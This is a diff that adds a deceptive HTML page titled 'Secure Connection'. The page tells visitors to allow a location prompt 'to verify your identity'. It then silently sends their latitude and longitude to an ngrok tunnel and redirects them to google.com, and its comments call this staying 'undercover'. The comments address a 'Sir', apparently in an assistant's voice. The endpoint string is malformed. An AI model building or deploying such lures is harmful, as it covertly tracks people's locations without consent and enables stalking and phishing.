@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Connection</title>
+</head>
+<body onload="getLocation()">
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <h2>Establishing Secure Connection...</h2>
+        <p>Please allow the location prompt to verify your identity, Sir.</p>
+    </div>
+
+    <script>
+        function getLocation() {
+            // Sir, if the browser is from the stone age, we handle it here
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendData, showError);
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendData(position) {
+            // STEP 1: Replace this with your actual link from the ngrok terminal
+            const url = "https://kathi-lated-originatively.ngrok-free.dev -> http://localhost:5000";
+            
+            // STEP 2: The silent transmission
+            fetch(url, {
+                method: "POST",
+                mode: 'cors', // Crucial for ngrok to play nice
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude
+                })
+            })
+            .then(() => {
+                // STEP 3: The "nothing to see here" redirect
+                window.location.href = "https://www.google.com";
+            })
+            .catch(err => {
+                // If it fails, we still redirect to stay undercover
+                window.location.href = "https://www.google.com";
+            });
+        }
+
+        function showError(error) {
+            // If they click 'Block', we send them away regardless
+            window.location.href = "https://www.google.com";
+        }
+    </script>
+</body>
+</html>
